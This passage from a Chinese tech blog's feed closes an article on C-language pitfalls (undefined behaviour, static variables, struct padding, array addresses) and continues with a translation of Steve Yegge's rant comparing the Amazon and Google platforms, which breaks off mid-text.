<li> 但是，你知道这段程序的退出码吗？在ANSI-C下，退出码是一些未定义的垃圾数。但在C89下，退出码是3，因为其取了printf的返回值。为什么printf函数返回3呢？因为其输出了’4′, ‘2’,’\n’ 三个字符。而在C99下，其会返回0，也就是成功地运行了这段程序。你可以使用gcc的 -std=c89或是-std=c99来编译上面的程序看结果。</li>
<li>另外，我们还要注意main()，在C标准下，如果一个函数不要参数，应该声明成main(void)，而main()其实相当于main(…)，也就是说其可以有任意多的参数。</li>
</ul>
<p>我们再来看一段代码：</p>
<p><span id="more-5761"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
void f(void)
{
   static int a = 3;
   static int b;
   int c;
   ++a; ++b; ++c;
   printf("a=%d\n", a);
   printf("b=%d\n", b);
   printf("c=%d\n", c);
}
int main(void)
{
   f();
   f();
   f();
}</pre>
<p>这个程序会输出什么？</p>
<ul>
<li>我相信你对a的输出相当有把握，就分别是4，5，6，因为那个静态变量。</li>
<li>对于c呢，你应该也比较肯定，那是一堆乱数。</li>
<li>但是你可能不知道b的输出会是什么？答案是1，2，3。为什么和c不一样呢？因为，如果要初始化，每次调用函数里，编译器都要初始化函数栈空间，这太费性能了。但是c的编译器会初始化静态变量为0，因为这只是在启动程序时的动作。</li>
<li>全局变量同样会被初始化。</li>
</ul>
<p>说到全局变量，你知道 静态全局变量和一般全局变量的差别吗？是的，对于static 的全局变量，其对链接器不可以见，也就是说，这个变量只能在当前文件中使用。</p>
<p>我们再来看一个例子：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
void foo(void)
{
    int a;
    printf("%d\n", a);
}
void bar(void)
{
    int a = 42;
}
int main(void)
{
    bar();
    foo();
}
</pre>
<p>你知道这段代码会输出什么吗？A) 一个随机值，B) 42。A 和 B都对（在“<a title="在函数外存取局部变量的一个比喻" href="https://coolshell.cn/articles/4907.html" target="_blank">在函数外存取局部变量的一个比喻</a>”文中的最后给过这个例子），不过，你知道为什么吗？</p>
<ul>
<li>如果你使用一般的编译，会输出42，因为我们的编译器优化了函数的调用栈（重用了之前的栈），为的是更快，这没有什么副作用。反正你不初始化，他就是随机值，既然是随机值，什么都无所谓。</li>
<li>但是，如果你的编译打开了代码优化的开关，-O，这意味着，foo()函数的代码会被优化成main()里的一个inline函数，也就是说没有函数调用，就像宏定义一样。于是你会看到一个随机的垃圾数。</li>
</ul>
<p>下面，我们再来看一个示例：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
int b(void) { printf(“3”); return 3; }
int c(void) { printf(“4”); return 4; }
int main(void)
{
   int a = b() + c();
   printf(“%d\n”, a);
}</pre>
<p>这段程序会输出什么？，你会说是，3，4，7。但是我想告诉你，这也有可能输出，4，3，7。为什么呢？ 这是因为，在C/C++中，表达的评估次序是没有标准定义的。编译器可以正着来，也可以反着来，所以，不同的编译器会有不同的输出。你知道这个特性以后，你就知道这样的程序是没有可移植性的。</p>
<p>我们再来看看下面的这堆代码，他们分别输出什么呢？</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">int a=41; a++; printf("%d\n", a);</code><br>
<code data-enlighter-language="c" class="EnlighterJSRAW">int a=41; a++ &amp; printf("%d\n", a);</code><br>
<code data-enlighter-language="c" class="EnlighterJSRAW">int a=41; a++ &amp;&amp; printf("%d\n", a);</code><br>
<code data-enlighter-language="c" class="EnlighterJSRAW">int a=41; if (a++ &lt; 42) printf("%d\n", a);</code><br>
<code data-enlighter-language="c" class="EnlighterJSRAW">int a=41; a = a++; printf("%d\n", a);</code></p>
<p>只有示例一，示例三，示例四输出42，而示例二和五的行为则是未定义的。关于这种未定义的东西是因为Sequence Points的影响（Sequence Points是一种规则，也就是程序执行的序列点，在两点之间的表达式只能对变量有一次修改），因为这会让编译器不知道在一个表达式顺列上如何存取变量的值。比如a = a++，a + a++，不过，在C中，这样的情况很少。</p>
<p>下面，再看一段代码：（假设int为4字节，char为1字节）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct X { int a; char b; int c; };
printf("%d,", sizeof(struct X));
struct Y { int a; char b; int c; char d};
printf("%d\n", sizeof(struct Y));</pre>
<p>这个代码会输出什么?</p>
<p style="padding-left: 30px;">a) 9，10<br>
b)12, 12<br>
c)12, 16</p>
<p>答案是C，我想，你一定知道字节对齐，是向4的倍数对齐。</p>
<ul>
<li>但是，你知道为什么要字节对齐吗？还是因为性能。因为这些东西都在内存里，如果不对齐的话，我们的编译器就要向内存一个字节一个字节的取，这样一来，struct X，就需要取9次，太浪费性能了，而如果我一次取4个字节，那么我三次就搞定了。所以，这是为了性能的原因。</li>
<li>但是，为什么struct Y不向12 对齐，却要向16对齐，因为char d; 被加在了最后，当编译器计算一个结构体的尺寸时，是边计算，边对齐的。也就是说，编译器先看到了int，很好，4字节，然后是 char，一个字节，而后面的int又不能填上还剩的3个字节，不爽，把char b对齐成4，于是计算到d时，就是13 个字节，于是就是16啦。但是如果换一下d和c的声明位置，就是12了。</li>
</ul>
<p>另外，再提一下，上述程序的printf中的%d并不好，因为，在64位下，sizeof的size_t是unsigned long，而32位下是 unsigned int，所以，C99引入了一个专门给size_t用的%zu。这点需要注意。在64位平台下，C/C++ 的编译需要注意很多事。你可以参看《<a title="64位平台C/C++开发注意事项" href="https://coolshell.cn/articles/3512.html" target="_blank">64位平台C/C++开发注意事项</a>》。</p>
<p>下面，我们再说说编译器的Warning，请看代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
int main(void)
{
    int a;
    printf("%d\n", a);
}</pre>
<p>考虑下面两种编译代码的方式 ：</p>
<ul>
<li>cc -Wall a.c</li>
<li>cc -Wall -O a.c</li>
</ul>
<p>前一种是不会编译出a未初化的警告信息的，而只有在-O的情况下，才会有未初始化的警告信息。这点就是为什么我们在makefile里的CFLAGS上总是需要-Wall和 -O。</p>
<p>最后，我们再来看一个指针问题，你看下面的代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
int main(void)
{
    int a[5];
    printf("%x\n", a);
    printf("%x\n", a+1);
    printf("%x\n", &amp;a);
    printf("%x\n", &amp;a+1);
}</pre>
<p>假如我们的a的地址是：0Xbfe2e100, 而且是32位机，那么这个程序会输出什么？</p>
<ul>
<li>第一条printf语句应该没有问题，就是 bfe2e100</li>
<li>第二条printf语句你可能会以为是bfe2e101。那就错了，a+1，编译器会编译成 a+ 1*sizeof(int)，int在32位下是4字节，所以是加4，也就是bfe2e104</li>
<li>第三条printf语句可能是你最头疼的，我们怎么知道a的地址？我不知道吗？可不就是bfe2e100。那岂不成了a==&amp;a啦？这怎么可能？自己存自己的？也许很多人会觉得指针和数组是一回事，那么你就错了。如果是 int *a，那么没有问题，因为a是指针，所以 &amp;a 是指针的地址，a 和 &amp;a不一样。但是这是数组啊a[]，所以&amp;a其实是被编译成了 &amp;a[0]。</li>
<li>第四条printf语句就很自然了，就是bfe2e104。还是不对，因为是&amp;a是数组，被看成int(*)[5]，所以sizeof(a)是5，也就是5*sizeof(int)，也就是bfe2e114。</li>
</ul>
<p>看过这么多，你可能会觉得C语言设计得真扯淡啊。不过我要告诉下面几点Dennis当初设计C语言的初衷：</p>
<p style="padding-left: 30px;"><strong>1）相信程序员，不阻止程序员做他们想做的事。</strong></p>
<p style="padding-left: 30px;"><strong>2）保持语言的简洁，以及概念上的简单。</strong></p>
<p style="padding-left: 30px;"><strong>3）保证性能，就算牺牲移植性。</strong></p>
<p>今天很多语言进化得很高级了，语法也越来越复杂和强大，但是C语言依然光芒四射，Dennis离世了，但是C语言的这些设计思路将永远不朽。</p>
<p><strong>（请勿用于商业用途，转载时请注明作者和出处）</strong></p>
 ]]></content>
<pubDate>2011-11-01T08:26:38+08:00</pubDate>
<guid>https://coolshell.cn/articles/5761.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ SteveY对Amazon和Google平台的吐槽 ]]></title>
<link>https://coolshell.cn/articles/5701.html</link>
<content><![CDATA[ 
<p>Steve Yegge， Amazon的前员工，现任Google员工，其本来想在Google+上和Google的员工讨论一些关于平台的东西，结果不小心把圈子设成了Public，结果这篇文章就公开给了全世界，引起了剧烈的反应。发布后很快他就马上把这篇文章删了，不过，互联网上早备份了下来——<a href="https://raw.github.com/gist/933cc4f7df97d553ed89/24386c6a79bb4b31fb818b70b34c5eab7f12e1ff/gistfile1.txt" target="_blank">SteveY’s Google Platforms Rant</a>。后来，Steve在<a href="https://plus.google.com/110981030061712822816/posts/bwJ7kAELRnf" target="_blank">其Google+上作了一些解释</a>，大体是说他喝多了，而且又是在凌晨，所以大脑不清，文章中的观点很主观，极端且不完整，还有Google的PR对他很好，等等，等等 。</p>
<p>几个星期前看到时就一直都想翻译一下这篇文章，不过因为最近事情太多，文章又很长，所以现在才翻译完成，翻译的不好，还请大家指正。</p>
<h3>导读</h3>
<p>在你阅读正文以前，我想说明几点，希望你注意一下：</p>
<ul>
<li>Steve这个人非常喜欢写长篇大论的东西。而且比较喜欢辛辣调侃和恶搞的文风，这点大家要注意！</li>
</ul>
<ul>
<li>文中先“骂”Amazon公司，再通过“骂”Amazon的创始人贝索斯Bezos并烘托出他的的悟性和雄心，最后教育了一下Google。</li>
</ul>
<ul>
<li>我把文章分成了三个部分，这样方便大家阅读和讨论。第一部分只是个人情绪化的抱怨，第二部分是说Amazon的成长，第三部分是教育Google，我觉得第二部和第三部分是重点。</li>
</ul>
<ul>
<li>对于我们来说，我们应该获取Steve那些关于平台（Platform）相关的那些有价值的观点。尤其是他说的Amazon如何进化成一个平台性的公司，以及阐述Google应该怎么做的那些观点。</li>
</ul>
<ul>
<li>关于对Amazon的那些指责，我想说，6年，对于一个世界级的互联网公司，已经很不一样了。</li>
</ul>
<h3 style="text-align: left;">正文</h3>
<h4 style="text-align: left;">第一部分</h4>
<p>我曾在Amazon工作了六年半，现在，我在Google的日子也差没不多这么长了。对于这两家公司，有一件事总是萦绕着我——这种感觉一天比一天强烈──那就是，Amazon每件事都做错了，而Google每件事都做对了。当然啦，这是很笼统的话，但却是惊人的准确，相当的疯狂吧。大概有一百甚至两百种不同的地方可以让我们去比较这两个公司，而Google可能在每一项都能胜出，如果我记的没错，除了其中3项以外。因为，我曾用电子表格把这些项都列出来了，只是法务部门不会让我给任何人看，即使人事招募部门很喜欢这个报表。</p>
<p><span id="more-5701"></span></p>
<p>这里，让我先给你个例子让你稍微体会一下：Amazon的人事雇用流程有根本上的缺陷，因为各个团队各招各的人，以至于，各团队之间的招聘标准相当的不一致性，即使他们通过各种努力来统一标准，但是实际操作上却是一团糟；他们没有真正的SRE（陈皓注：Site Reliability Engineer ），工程师们什么事都要做（陈皓注：所谓SDE – Someone Do Everything）、几乎没时间编码。当然，不同的部门有不同的情形，不过，这取决于你的运气。他们不搞慈善，也不帮扶贫困人群，也不搞社区贡献，或是其它相似的活动。在那里，他们从来不谈这些，或许只有在说笑话的时候才会提到。他们的办公环境是个灰尘及污迹四处的像农场一样的隔间，他们在公共区域连一分钱装修的都不会花，而且，他们的薪水和福利相当差，只是近来与Google和Facebook竞争人才，这个差距才变得非常地小。不过，他们没有我们有的津贴或额外奖金——他们只是给你录用信上的那个数字，就这么多。他们的程序代码完全就是灾难，无论什么都没有任何的工程标准，除了各别团队有一些。</p>
<p>公平起见，他们的确有套非常非常不错的版本控制管理系统，而这是我们（Google）需要尽力赶上他们的地方，他们还有一个漂亮的发布/订阅系统，我们也没有相对应的东西。不过，就大体而言，他们有的不过是一堆蹩脚的工具，用关系数据库来读取或写入状态机里的信息中罢了。我们不应该这么搞就算这样做是可以。</p>
<p>这就是我所所说的那3件事中的两件事Amazon比Google强的，那就是的他们的发布/订阅系统以及版本控制和管理系统。</p>
<p>我猜你也许会为他们争辩到——他们要更快更早地推出服务并通过狂热地迭代来不断地改进和完善。他们把服务发布的优先级看得比任何事都重，包括工程纪律或是其它一堆可能会让其花时间的事务。所以，即使这么做让他们在市场上有了某种程度的竞争优势，但也造成其他足够多的问题，总之，这样的做法算不上是个漂亮的扣篮。</p>
<p>但是，他们有一件事做的非常非常好，其好到可以把其他政治，理念，技术上的消耗和混乱<strong>完全</strong>弥补回来。</p>
<h4>第二部分</h4>
<p>Jeff Bezos是个臭名昭彰的微管理经理人，他的微管理都管理到了Amazon零售网站上的每一个显示像素。他雇佣了Larry Tesler——Apple的首席科学家，他可能是全世界最有名也最受尊敬的人机交互接口专家，然而，Bezos忽略了Larry三年来提出的每一个建议，直到Larry最后——明智地——终于离开了公司。Larry本应做一些大型可用性（Usability）研究，并可以系统地了解那个根本就没有人能够搞懂、使用那该死的网站，可是，Bezos对于那些像素不放手，这些页面上的那几百万个显示像素就像是他的孩子一样。所以，他的这些孩子还留着，而Larry没有。</p>
<p>当然，微管理不是第3项Amazon做的比我们好的事。我的意思是，没错，他们微控管理做地非常地好，但我不会把这项列在他们的强项清单上。我这样说只不过是为了我下文做铺垫，帮助你了解我后面要说的事儿。我们现在要说的这个人，是在多个严肃的公开场合说要来Amazon工作就应该付他钱才对的人。当有人跟他意见不同时，他会递出写有他名字的黄色即时贴以提醒那个人“谁是公司的老大”。这家伙是……，Steve Jobs，我想，除了没有品味和设计能力，他们很相似。千万别误解我，Bezos是个绝顶聪明的人，只不过他把那些正常的管控搞得像嗑了药的嬉皮士一样罢了。</p>
<p>所以，有一天，Jeff Bezos下了一份命令。当然，他总是这么干，这些命令对人们的影响来说就像用橡皮槌敲击蚂蚁一样。这个命令大概是2002年，我想误差应该是在正负1年内 —— 这个命令发布的范围非常地广，设想很大，让人眼珠子鼓出来的那种，这种惊讶程度和其他的命令相比，就好像你突然收到公司给你的奖金一样让人惊讶。</p>
<p>这份大命令大概有如下几个要点：（陈皓注：这里是本篇文章的要点！如果这真是Bezos发出来的，那么太赞了，Bezos完全就是一个系统架构大师啊，那可是2002年左右啊。作者调侃Bezos完全是正话反说啊）</p>
<blockquote>
<ul>
<li>1) 所有团队的程序模块都要以通过Service Interface 方式将其数据与功能开放出来。（陈皓注：Service Interface也就是Web Service）</li>
</ul>
<ul>
<li>2) 团队间的程序模块的信息通信，都要通过这些接口。</li>
</ul>
<ul>
<li>3) 除此之外没有其它的通信方式。其他形式一概不允许：不能使用直接链结程序、不能直接读取其他团队的数据库、不能使用共享内存模式、不能使用别人模块的后门、等等，等等，唯一允许的通信方式只能是能过调用 Service Interface。</li>
</ul>
<ul>
<li>4) 任何技术都可以使用。比如：HTTP、Corba、Pubsub、自定义的网络协议、等等，都可以，Bezos不管这些。（陈皓注：Bezos不是微控经理吗？呵呵。）</li>
</ul>
<ul>
<li>5) 所有的Service Interface，毫无例外，都必须从骨子里到表面上设计成能对外界开放的。也就是说，团队必须做好规划与设计，以便未来把接口开放给全世界的程序员，没有任何例外。</li>
</ul>
<ul>
<li>6) 不这样的做的人会被炒鱿鱼。</li>
</ul>
<ul>
<li>7) 谢谢，祝你有个愉快的一天！</li>
</ul>
</blockquote>
<p>哈哈！你们这150个前Amazon的员工，当然能马上看出第7点是我开玩笑加上的，因为Bezos绝不会关心你的每一天。</p>
<p>不过第6点是很真实的，于是，所以人们都去工作。Bezos并派出了几位首席牛头犬来监督并确保进度，领头的是和熊一样大的牛头犬：Rick Dalzell，Rick是以前是陆军突击队队员，西点军校毕业生，拳击手，和沃尔玛的首席虐刑官 / CIO，而且他也是个高大、和蔼、令人敬畏的人，还是经常使用”hardened interface”词的人，Rick 本来的走路和说话都比较hardened interface，所以不用多说，每个人都得干 出有<strong>重大的</strong>进展，这样Rick才能看得见。</p>
<p>在接下来的几年，Amazon内部转变成面向服务架构SOA(Service-Oriented Architecture)，在这华丽转身的过程中，他们学到了相当巨多巨多的东西。我在的那个时候，世界上就有很多很多的关于SOA的学术文档，但在Amazon的那种超大规模的面前，世间的这些文档就好像告诉印第安纳琼斯（陈皓注：电影夺宝奇兵男主角）过马路前要先看看两边有没有来车一样没用，Amazon的研发工程师们在这个过程中发现了很多很多的问题，并从中学到了很多。下面只是他们这些问题中的沧海一粟：</p>
<ul>
<li>pager escalation（陈皓注：生产线上问题的寻呼系统）变得比较困难，因为ticket可能会转过来转过去（陈皓注：ticket就是处理问题的工单），只到转了20次，都找到真正能解决问题的团队和人。如果每一个呼叫都花去团队的15分钟的响应时间，那在找到真正的团队之前，几小时就已经过去了，除非，你能建造出很多很多的脚手架，测量标准和报告。</li>
</ul>
<ul>
<li>每一个和你的相关团队突然间都可能成为一个潜在性的DOS攻击者。没人可以让事情有进展，直到在每一个Service里放上配额（quota）与节流阀（throttling）的机制。</li>
</ul>
<div>
<ul>
<li>监控与QA是被统一了。如果你不进行一个大规模的SOA，你就不会这么去想。但是，等到你的Service说，“是的，我还好！”，但实际情况可能是，服务器里唯一能正常运作的功能就是一个快乐的机器声音在呼叫你：“我很好，收到，收到”。为了要确认整个服务能正常运作，你需要对Service的每一个部分都去Call一下。这个问题会以递归的形式地出现，直到你的监控系统能够全面性地系统地检查所有的Services和数据，此时，监控系统就跟自动化测试QA没什么两样了，所以两者完美的统一了。</li>
</ul>
</div>
<ul>
<li>如果你有上百个Services，而且你的程序只能通过由这些Services来跟其他团队的程序做沟通，那么，没有一套Service发现机制的话，你就不能找到这些Service。所以，你得先有一套Service的注册机制，这也是一个Service。所以，Amazon有一套全体适用的Service注册机制，以例可以通过反射机制来找到Service，并知道Service的API，以及是否可用，在哪儿。</li>
</ul>
<ul>
<li>调试其他人的代码以调查问题变得非常的难，几乎都不可能，除非有一套全面性的标准的方式，他可以在可被调试的沙盒里运行所有的Services。</li>
</ul>
<div>上面这些只是极少数几个例子，在Amazon在进化的过程中，Amazon遇到这样的问题可能一打甚至数百个，Amazon都一一学习和总结了。对于把Service外部化甚至还有很多几乎没有人会想到的非常生僻的东西，当然，也不会有你想像的那么多，Amazon都学到了。把业务组织成Service让团队学会了不能相信对方，就如同他们不能信任公司以外的程序员一样。</div>
<p>当我在2005年中期离开Amazon加入Google时，这个努力进化的过程还在进行时中，但那时已经相当的先进了。从Bezos颁布法令的时间到我离开的时候，Amazon已经把文化转变成了“一切以Service第一”为系统架构的公司，今天，这已经成为他们进行所有设计时的基础，包括那些绝不会被外界所知的仅在内部使用的功能。</p>
<p>那时，如果没有被解雇的的恐惧他们一定不会去做。我是说，他们今天仍然怕被解雇，因为这基本上是那儿每天的生活，为那恐怖的海盗头子Bezos工作。不过，他们这么做的确是因为他们已经相信Service这就是正确的方向。他们对于SOA的优点和缺点没有疑问，某些缺点还很大，也不疑问。但总的来说，这是正确的，因为，SOA驱动出来的设计会产生出平台（Platform）。</p>
<p>是的，这就是Bezos的法令要达成的目标。他以前（现在也是）一点不关心各团队是否好，也不关心他们使用什么样的技术，实际也不去管他们如何运作他们的业务，除非团队开始把事搞砸。但是，Bezos比绝大多数的亚马逊人都很早很早就领悟到，Amazon必须成为一个平台。</p>
<p><strong>如果是你，你会想到要把一个在线卖书的网站设计成为一个有扩展性，可程序化的平台？你真的会这样想吗？</strong></p>
<p>嗯，第一件Bezos领悟到的大事是，为了销售书籍和各种商品需要的基础架构，这个基础架构可以被转变成为绝佳计算平台（Computing Platform）。所以，现在他们有了Amazon Elastic Compute Cloud（亚马逊弹性运算云平台EC2），Amazon Elastic MapReduce，Amazon Relational Database Service（亚马逊关系数据库服务），以及其他可到AWS <a href="https://aws.amazon.com/">aws.amazon.com</a>查得到的一堆Service。这些服务是某些相当成功的公司的后台架构，比如 我个人喜欢的 reddit 是这一堆成功公司的其中一个。</p>
<p>另一大领悟是，他知道他们不可能永远都创造出对的东西。我认为，当Larry Tesler说他妈妈完全搞不懂怎么使用那个该死的网站时，Bezos的某根筋被触动了，当然，我也不清楚到底是谁家母亲，这无关紧要，因为没有人的母亲能够会用那个该死的网站。事实上，连我这个在那工作超过5年的人都觉得Amazon网站的接口令人胆战惊心。</p>
<p>我并不是很确定Bezos是如何领悟到的——领悟到他不能创造 出一个产品能适用于所有的人。不过，怎么来的这不重要，重要的是他的确领悟了。这种事有一个正式的术语，叫Accessibility，这是计算机世界中最最重要的事情了。</p>
<p>最！重！要！的！事！</p>
<p>如果你在心里面在想“哼？你是说，像盲人和聋人那种Accessibility吗？”，那么，你不是唯一这样想的人，因为我已经知道有<strong>很多很多</strong>像你这样的人：这种东西对你们这种人来说是不可能有正确的Accessibility，所以这事你还不能理解。当然，不能理解也不是你的错，就像眼盲，耳聋，或是其他行动不便的残疾人，这些也不是他们的错。当Software——或ideal-ware——如果因为某些原因不能被存取或使用，那么，这就是软件或是那想法的错了。这就是Accessibility failure。</p>
<p>就如同生命中那些重大的事一样， 每个事都有一个邪恶的双胞胎姊妹，它在幼年都受到父母的溺爱，现在它已经成长为同等强大的复仇女神（是的，Accessibility有不只一个复仇女神），这个复仇女神叫安全性（Security），他们在一起总是争执不休，冤家一对。</p>
<p>不过，我会和你争论Accessibility要比安全性来的重要多了，因为零Accessibility就意为着你根本没有做出产品来，而如果安全性为零，你仍然还是可以有一个某个程度上成功的产品，譬如说Playstation Network。</p>
<p>对了，也许你还没注意到，我其实可以为这篇文章写出一整本书，很厚的一本，其中填满了那家我曾工作过的公司里关于蚂蚁与橡皮槌的事。但是，我可能也就永远无法在这发表这短篇的夸夸其谈了，而你也就无法读到除非我现在开始结尾。</p>
<h4>第三部分</h4>
<p>那三件Amazon比Google强的中的最后一件事是，Google很不会做平台（Platform）。我们就不懂什么是平台。我们就根本不知道平台的内涵。你们其中一些人明白，但是你们是少数派。在Google过去这六年来，越清楚这一点就越让我痛苦。我曾有一线希望，来自Microsoft和Amazon，以及近来Facebook的竞争压力，会让我们全体人都清醒过来，并开始打造我们公司的Service。不是那种特制的或半生不熟的，而是多少和Amazon的类似的那种：一次到位，真正的，没有作弊或是欺骗，并且把它放在最高优先级的位置。</p>
<p>但实际上却不是，这个事被放在了好像是第10还是第11位，或是第15位，我不知道，反正是相当低。只有少数几个团队严肃地看待这个事，但大多数的团队不是<strong>从没有</strong>思考过这个事，就是只有一很少的人很鼠目寸光地在看待这个事。</p>
<p>对大多数的团队来说，只要是让他们以提供给别人那种可程序化的方式存取他们的数据与运算的方式来开发软件，就算几个小小的粗糙的Service，对他们来说也是翻天覆地。他们大部分人都认为他们在做产品，但他们只是在提供那些凄惨粗糙的Service。回去看看前面我所列的那些部分的Amazon学到的东西，然后告诉我，哪一个粗糙的Service能让你有超凡脱俗的产品。迄今为止，就我所知，一个也没有。就算是这些粗糙的东西很不错，不过这就好像要汽车的时候，你却只有汽车的零件。</p>
<p><strong>没有平台的产品是没用的，再精确一点，去平台化的产品总是被平台化的产品所取代</strong>。</p>
<p>Google+是我们完全失败的不懂Platform最明显的例子，从最高层的管理层（嗨，Larry、Sergey、Eric、Vic，你们好）一直到最最底层的员工（嘿，你）都不懂。我们全部统统都不懂。平台Platform的黄金守则是Eat Your Own Dogfood（吃你自己的狗食——自己都要用自己的平台）。Google+这个平台是个杯具的事后抄袭者。我们在发布它的时候完全没有任何API。我查了一下，目前也只有少得可怜的API。Google+的一个团队的成员在发布API时告诉我这个事，我问：“这是Stalker API（用来偷窥内部数据的API）吗？”，她郁闷地说，“是啊”。我的意思是，我那只是个玩笑话，但是，不，我们提供的唯一的API就是取得某人的信息流，所以，我想我把玩笑开到自己头上了。</p>
<p>Microsoft知道“狗食守则”至少有20年了。这已经成为他们世世代代文化的一部分了。不能是你吃人类的食物而给你的开发人员们喂狗食。那样做只会是为了短期的成功而掠夺了平台长期价值。平台就是要你考虑得长远。</p>
<p>Google+就像膝跳反射，一种短视的的东西，是基于以为Facebook其伟大产品的成功作出的错误判断。但那不是为什么他们能成功的东西。Facebook的成功是因为他们建立了一个可以让外界在其上上面开发的产品群。所以对Facebook对每个人来都不一样。有些人把全部时间花在“Mafia Wars”上，有些人则是花在“Farmville”（开心农场）。那里还有成百上千个不同的高质量的时间消耗类的游戏，所以，人们总是可以在那里找到他们想要的。</p>
<p>我们的Google+团队看了看说：“哎呀，看来我们需要一些游戏，让我们去找一些人来为我们写些游戏吧”。你是否开始看到这样的的思考有多么不靠谱了吗？问题在于我们试图在预测人们想要什么，然后推出产品给他们。</p>
<p>你不能这么做。真的不能。也不可靠。在这个世上，甚至在整个计算机的历史上，只有极少数几个人能够这么干，Steve Jobs是其中一个。但是我们没有Steve Jobs。对不起，我们真的没有。</p>
<p>Larry Tesler有可能说服了Bezos相信他并不是Steve Jobs，但Bezos意识到他不需要成为Steve Jobs也能提供给所有人好的产品：大家感到容易使用的接口与工作流。Bezos明白他只要有让第三方开发人员来做的平台，这些东西自然就会有的。</p>
<p>我要向一些人道歉，这些人会觉得我所说的是再明显不过的了。是的，的确是巨明显的。只是我们没有去做。我们没有领会平台，我们也无法领会到Accessibility。这两者本来就是同一件事，因为平台会解决Accessibility。而平台就是Accessibility。</p>
<ul>
<li>是的，Microsoft领会到了。而且你们也像我一样知道Microsoft他们对这些东西一知半解。那是因为他们能够了解平台完全是他们商业上意外性的副产品，是他们一开始的业务就是提供平台。所以他们在这个领域有着三十多年的经验。如果你去看看 <a href="http://msdn.com/" target="_blank">msdn.com</a>，并多花点时间浏览一下，假设你以前从没去看过，你等着被吓到吧，因为那里面的东西可是多得不能再多。他们拥有<strong>成千成千成千</strong>个API。他们拥有一个<strong>超巨大</strong>的平台。说实话，太巨大了，因为他们要霸占一切，但至少他们做了。</li>
</ul>
<ul>
<li>Amazon也领会了到了。Amazon的AWS(<a href="https://aws.amazon.com/">aws.amazon.com</a>)相当的惊人。去看看吧，四处点一下。令人羞耻吧。我们今天什么都还没有。</li>
</ul>
<ul>
<li>很明显Apple也领会到了。他们做了在基础上不开放的选择，具体来说是移动平台。但是他们明白什么是Accessibility，并且他们知道如何燃起第三方开发团体的力量，而且他们吃自己的狗食。你知道吗？他们的狗食做得很好吃啊。他们的APIs比Microsoft的要干净不知道多少倍，而且是远古的时候就这样了。</li>
</ul>
<ul>
<li>Facebook也领会到了。这正是让我所担心的。这使得我不得我抬起懒惰屁股写下这些东西。我恨写Blog。我恨……Plus（指Google Plus）不管怎么称呼它，反正在Google+上发表长篇大论，就算这是个糟糕的地方，但是你还是希望Google能成功.我真希望！我的意思是，Facebook想挖我，而且很容易就去了。但Google是我的家，所以我坚持我这个小小的家庭干涉，就算你不舒服。</li>
</ul>
<p>等到你为Microsoft与Amazon提供的平台感到神奇后，当然，我想也你可能会被Facebook吓到（我不敢去看，因为我不想让我太沮丧），让我们回头看看 <a href="https://developers.google.com/">developers.google.com</a> 。是不是有很大的差别？我们的这个平台看起来像是你家小学五年级的侄子搞出来的东西一样——让一个小学五年级的学生，试着为一个强大的的平台公司去设计平台，就像像我们问这个小学生：“如果这家公司什么资源都有，那你会做出个什么东西来？” 一样。</p>
<p>这里请不要误解我——我知道一个事实，dev-rel 团队为了发布这些API曾经不得不去“搏斗”。据我所知，这个团队很不错，因为他们知道什么是平台，并且他们如英雄般努力挣扎地要做出来，然而遇到的却是“平台冷漠”的环境，难听点还是那种有敌意的环境。</p>
<p>我只是在直白地描述出一下 <a href="https://developers.google.com/" target="_blank">developers.google.com</a> 在外人眼里是什么样子。它看起来很幼稚。Maps APIs在哪呢，老天啊？其中有些东西还是实验性的项目，我点进去看的APIs……他们都毫无价值。他们很明显都是些真正的狗食。甚至都称不上是好的有机食品。跟我们内部APIs比起来，他们全部简直就是猪屎马粪。</p>
<p>当然，也不要错误地理解我对Google+的看法。他们还不算是最差的。这是文化氛围的事。我们现在做的简单来说就是要进行一场战争，是一场失败很多的少数的平台派和那些强大的信心坚持的产品派的战争。</p>
<p>那些从头到尾明白理解供外部可程序化的平台概念的团队都是受压迫的人——Maps跟Docs团队浮现在我脑海中，而且我也知道GMail是这个方向的先头部队，但是他们很难得到资金注入，因为这不是我们文化的一部分。Maestro的资金完全没法和Microsoft Office开发平台的资金相比：就像小白兔和暴龙相比一样。Docs团队知道自己永远无法和Office竞争，除非他们能赶上Office的脚本能力，而且他们得不到他们相要的资源。我的意思是我假定他们没有，现在应用的脚本能力只在电子表格中有，而且没有为API设置键盘快捷键。在我看来，这个团队完全没有被重视。</p>
<p>具有讽刺意的是，Wave是个伟大的平台，愿他能安静地长眠。我们需要知道，做一个平台并不会马上给带来成功。平台需要杀手级应用。Facebook——他们供应了的涂鸦墙和朋友关系网等其他东西——则是Facebook平台的杀手级应用。但是，如果你说没有Facebook平台，仅有Facebook应用也能像今天这样成功，那么，这会是一个非常严重的错误。</p>
<p>你知道吗？人们总是在说Google的傲慢自大。我是个Google人，所以我和你一样当听到那些话都会觉得很愤怒。但总体而言，我们并不傲慢。我们大约99%不自大。我在文章开头时就写到——如果你回去看看—— 我是这样描述Google的“所有的事都做对了”。我们知道人们为什么要这么说我们自大，因为我们没有雇用他们，或是因为他们对我们的政策不爽，或是那一类的事情。他们推断出我们自大是因为这样会让他们心理平衡一些。（陈皓注：作者在这里的反话正说）</p>
<p>但是，当我们摆出那种我们知道怎么给用户设计出完美的产品的姿态时，你最好相信我，我们就是笨蛋。你可以说是自大，天真，或是别的什么，无所谓，但最终的结果就是我们干的很愚蠢。因为，这世界不可能有一个产品对所有人都是完美的。</p>
<p>你看，我们的浏览器居然不能让人设定默认的字号。这就是我们对Accessibility的公然冒犯。我的意思是，我总有一天会老的，我也会得老花眼，并会变瞎的。我的意思是我不会变瞎，但是如果你到了40岁，你的老花眼让你看不清近的东西。那么，字号的选择会成为生和死的问题：某用户就会被完全排除在产品之外。但是Chrome团队就是这么NB傲慢：他们想要开发出无需配置的产品，他们对此相当自豪，去你TMD是瞎子还聋子，管你是谁，在你剩下的日子每访问一个页面都按一下Ctrl-+吧。</p>
